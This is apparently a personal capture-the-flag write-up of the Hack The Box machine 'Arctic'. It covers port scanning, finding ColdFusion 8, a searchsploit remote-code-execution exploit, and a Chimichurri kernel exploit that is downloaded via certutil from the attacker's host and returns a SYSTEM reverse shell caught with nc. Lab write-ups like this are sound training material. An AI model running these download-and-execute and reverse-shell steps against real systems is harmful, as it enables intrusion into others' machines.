## Intro

![](MediaFiles/Pasted%20image%2020260228204853.png)
Tags: #windows #OSCPpath #VulnOS #easy

---------
# Reconnaissance

## Port scan

### Identify open TCP ports fast

```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv arctic.htb
```

```shell
└─$ sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv arctic.htb                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 17:41 UTC
Initiating SYN Stealth Scan at 17:41
Scanning arctic.htb (10.129.12.4) [65535 ports]
Discovered open port 135/tcp on 10.129.12.4
Discovered open port 8500/tcp on 10.129.12.4
Discovered open port 49154/tcp on 10.129.12.4
Completed SYN Stealth Scan at 17:41, 26.66s elapsed (65535 total ports)
Nmap scan report for arctic.htb (10.129.12.4)
Host is up, received user-set (0.091s latency).
Scanned at 2026-02-28 17:41:03 UTC for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.75 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
```

### Scan only the open TCP ports

```shell
sudo nmap -p135,8500,49154 -A arctic.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 17:42 UTC
Nmap scan report for arctic.htb (10.129.12.4)
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   424.68 ms 10.10.14.1
2   425.54 ms arctic.htb (10.129.12.4)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.73 seconds
```

## RPC enumeration

### Anonymous login
```shell
rpcclient -U "" -N -p 135 arctic.htb
rpcclient -U "" -N -p 49154 arctic.htb
```
no luck

## Web Enumeration
### Directories

feroxbuster?


### Page navigation

`http://arctic.htb:8500/`
```shell
Index of /

CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ
```
lets explore CFIDE first
```shell
Parent ..                                              dir   03/22/17 08:52 μμ
Application.cfm                                       1151   03/18/08 11:06 πμ
adminapi/                                              dir   03/22/17 08:53 μμ
administrator/                                         dir   03/22/17 08:55 μμ
classes/                                               dir   03/22/17 08:52 μμ
componentutils/                                        dir   03/22/17 08:52 μμ
debug/                                                 dir   03/22/17 08:52 μμ
images/                                                dir   03/22/17 08:52 μμ
install.cfm                                          12077   03/18/08 11:06 πμ
multiservermonitor-access-policy.xml                   278   03/18/08 11:07 πμ
probe.cfm                                            30778   03/18/08 11:06 πμ
scripts/                                               dir   03/22/17 08:52 μμ
wizards/                                               dir   03/22/17 08:52 μμ
```

---------
# Foothold

## Vulnerable webapp version

Then tried navigating them
`http://arctic.htb:8500/CFIDE/administrator/`
This goes to admin login page
admin admin doesn't work, then i searched for default admin creds, no luck
But i got the information about the website's version
`Adobe coldfusion 8`

## Shell as user (tolis)

```shell
searchsploit adobe fusion 8
```

```shell
Adobe ColdFusion 8 - Remote Command Execution (RCE | cfm/webapps/50057.py
```
and by running it i got shell as tolis and grabbed user flag
```powershell
listening on [any] 4444 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.12.4] 49342

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
C:\Users\tolis\Desktop>type user.txt    
type user.txt
59e3b84c23d5a507491c8ea4dc5dfd49
```

-------
# Privesc

### Stored creds ❌

```powershell
C:\Users\tolis\Favorites\Microsoft Websites>cmdkey /list
cmdkey /list

Currently stored credentials:

* NONE *
```
not found

### Filesystem enumeration ❌

```powershell
C:\Users\tolis>tree
tree
Folder PATH listing
Volume serial number is 5C03-76A8
C:.
����Contacts
����Desktop
����Documents
����Downloads
����Favorites
�   ����Links
�   ����Microsoft Websites
�   ����MSN Websites
�   ����Windows Live
����Links
����Music
����Pictures
����Saved Games
����Searches
����Videos
```
found nothing interesting here

### Privileges ❌

```powershell
C:\Users\tolis\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## SystemInfo ✅

```powershell
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          2/3/2026, 3:22:37 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.112 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.277 MB
Virtual Memory: In Use:    1.008 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.12.4
```

### Vulnerable OS version
this windows version is vulnerable `Windows server 2008 R2`
found this
https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled
and from the previous output, we also see: 
```powershell
Hotfix(s):                 N/A
```
which means its `unpatched` so lets attempt to exploit it

## Shell as Administrator

download it and transfer it
```powershell
powershell wget http://10.10.14.106:8001/Chimichurri.exe -o Chimichurri.exe

curl http://10.10.14.106:8001/Chimichurri.exe -o Chimichurri.exe
```
these  2 above did not work, certutil did work tho

```powershell
certutil.exe -urlcache -f http://10.10.14.106:8001/Chimichurri.exe C:\Windows\Temp\Chimichurri.exe
```

```powershell
.\Chimichurri.exe 10.10.14.106 3333
```

```powershell
C:\Windows\Temp>.\Chimichurri.exe 10.10.14.106 3333
.\Chimichurri.exe 10.10.14.106 3333
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```
got connection back
```powershell
└─$ nc -lvnp 3333                               
listening on [any] 3333 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.12.4] 49460
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\Temp>whoami
whoami
nt authority\system
C:\Windows\Temp>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
a3ef04c2e902ed0d124309b87cc753a7
```

--------
# Summary



-----
# Sidenotes

A very easy windows machine. The only highlight here if there must be one would be the vulnerable OS version, no actual knowledge gained here since i have done similar boxes.

https://labs.hackthebox.com/achievement/machine/284567/9
![](MediaFiles/Pasted%20image%2020260228205002.png)